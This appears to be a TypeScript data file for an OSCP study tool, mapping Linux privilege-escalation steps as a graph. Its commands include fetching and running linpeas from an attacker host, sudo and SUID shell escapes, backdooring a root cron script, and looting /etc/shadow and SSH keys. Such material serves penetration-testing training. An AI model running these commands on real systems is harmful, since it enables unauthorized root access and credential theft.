import type { OscpContent } from '@/types/oscp'

/** Phase: Linux privilege escalation. */
const linuxPrivesc: OscpContent = {
    nodes: [
        {
            id: 'privesc-enum-linux',
            title: 'Enumerate for privesc (Linux)',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Run the quick manual checks, then linpeas. The usual wins: sudo -l, SUID binaries, writable cron, capabilities, kernel version, and creds lying in files.',
            commands: [
                {
                    label: 'First things to run',
                    code: `id; sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
uname -a; cat /etc/os-release`,
                },
                {
                    label: 'linpeas',
                    code: 'wget http://<kali-ip>/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh',
                },
            ],
            tags: ['linpeas', 'enumeration', 'sudo', 'suid'],
        },
        {
            id: 'sudo-abuse',
            title: 'Sudo misconfiguration',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                '`sudo -l` shows a command you may run as root. Look it up on GTFOBins for a shell escape. NOPASSWD entries and sudo env tricks (LD_PRELOAD) are common.',
            commands: [
                {
                    label: 'Exploit a sudo entry',
                    code: `sudo -l
# example GTFOBins escapes:
sudo find . -exec /bin/sh \\; -quit
sudo vim -c ':!/bin/sh'`,
                },
            ],
            references: [{ label: 'GTFOBins', url: 'https://gtfobins.github.io/' }],
            tags: ['sudo', 'gtfobins', 'nopasswd'],
        },
        {
            id: 'suid-sgid',
            title: 'SUID / SGID binary',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A binary runs as its owner (root). Custom SUID binaries often call other programs by relative path (PATH hijack) or via system(). Standard ones map to GTFOBins.',
            commands: [
                {
                    label: 'Find + exploit',
                    code: `find / -perm -4000 -type f 2>/dev/null
# GTFOBins example:
install -m 4755 /bin/bash /tmp/bash 2>/dev/null; /tmp/bash -p`,
                },
            ],
            references: [{ label: 'GTFOBins (SUID)', url: 'https://gtfobins.github.io/#+suid' }],
            tags: ['suid', 'sgid', 'gtfobins'],
        },
        {
            id: 'cron-abuse',
            title: 'Writable cron / script',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A root cron runs a script you can write (or a wildcard you can inject). Append a reverse shell or SUID drop and wait for the next tick.',
            commands: [
                {
                    label: 'Backdoor a writable root script',
                    code: "echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/writable.sh",
                },
            ],
            tags: ['cron', 'timer', 'wildcard', 'pspy'],
        },
        {
            id: 'linux-capabilities',
            title: 'Dangerous capability',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'A binary carries a capability (cap_setuid, cap_dac_read_search). These grant root-equivalent power without SUID.',
            commands: [
                {
                    label: 'Find + abuse',
                    code: `getcap -r / 2>/dev/null
# python with cap_setuid:
./python -c 'import os;os.setuid(0);os.system("/bin/sh")'`,
                },
            ],
            tags: ['capabilities', 'getcap', 'cap_setuid'],
        },
        {
            id: 'nfs-no-root-squash',
            title: 'NFS no_root_squash',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'An export with no_root_squash lets you write files as root from your box. Mount it, drop a root-owned SUID binary, execute it on the target.',
            commands: [
                {
                    label: 'Mount + plant SUID',
                    code: `showmount -e <target>
sudo mount -t nfs <target>:/export /mnt
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash   # as root on Kali
# on target: /export/rootbash -p`,
                },
            ],
            tags: ['nfs', 'no_root_squash', 'mount'],
        },
        {
            id: 'kernel-exploit-linux',
            title: 'Kernel exploit',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Last resort - match the kernel version to a public exploit (DirtyPipe, DirtyCow, PwnKit/pkexec). Reboots can break the box; note it in the report.',
            commands: [
                {
                    label: 'Version match',
                    code: 'uname -a\nsearchsploit linux kernel <version>',
                },
            ],
            tags: ['kernel', 'dirtypipe', 'pwnkit', 'dirtycow'],
        },
        {
            id: 'cred-hunt-linux',
            title: 'Credential hunting',
            type: 'technique',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Search configs, history, mail, and home dirs for passwords and SSH keys. Reused creds often escalate you or open the next host.',
            commands: [
                {
                    label: 'Hunt',
                    code: `grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
find / -name id_rsa 2>/dev/null; cat ~/.bash_history`,
                },
            ],
            tags: ['credentials', 'ssh-key', 'config', 'hunting'],
        },
        {
            id: 'root-linux',
            title: 'root on Linux',
            type: 'state',
            phase: 'linux-privesc',
            os: 'linux',
            description:
                'Box owned. Grab the root flag, then loot: /etc/shadow, SSH keys, and app configs. On a domain-joined host, harvested creds feed lateral movement.',
            commands: [
                {
                    label: 'Loot',
                    code: 'cat /etc/shadow; cp /root/.ssh/id_rsa .; find / -name "*.kdbx" 2>/dev/null',
                },
            ],
            tags: ['root', 'owned', 'loot', 'shadow'],
        },
    ],
    edges: [
        { from: 'privesc-enum-linux', to: 'sudo-abuse', label: 'sudo -l has entries' },
        { from: 'privesc-enum-linux', to: 'suid-sgid', label: 'unusual SUID binary' },
        { from: 'privesc-enum-linux', to: 'cron-abuse', label: 'writable root cron' },
        { from: 'privesc-enum-linux', to: 'linux-capabilities', label: 'capability set' },
        { from: 'privesc-enum-linux', to: 'kernel-exploit-linux', label: 'old kernel, nothing else' },
        { from: 'privesc-enum-linux', to: 'cred-hunt-linux', label: 'look for creds/keys' },
        { from: 'sudo-abuse', to: 'root-linux', label: 'root shell' },
        { from: 'suid-sgid', to: 'root-linux', label: 'root shell' },
        { from: 'cron-abuse', to: 'root-linux', label: 'cron fires' },
        { from: 'linux-capabilities', to: 'root-linux', label: 'setuid(0)' },
        { from: 'nfs-no-root-squash', to: 'root-linux', label: 'SUID drop runs' },
        { from: 'kernel-exploit-linux', to: 'root-linux', label: 'exploit lands' },
        { from: 'cred-hunt-linux', to: 'creds-found', label: 'creds/keys recovered' },
        { from: 'root-linux', to: 'creds-found', label: 'dump shadow / keys' },
        { from: 'root-linux', to: 'ad-foothold', label: 'domain-joined host' },
    ],
}

export default linuxPrivesc
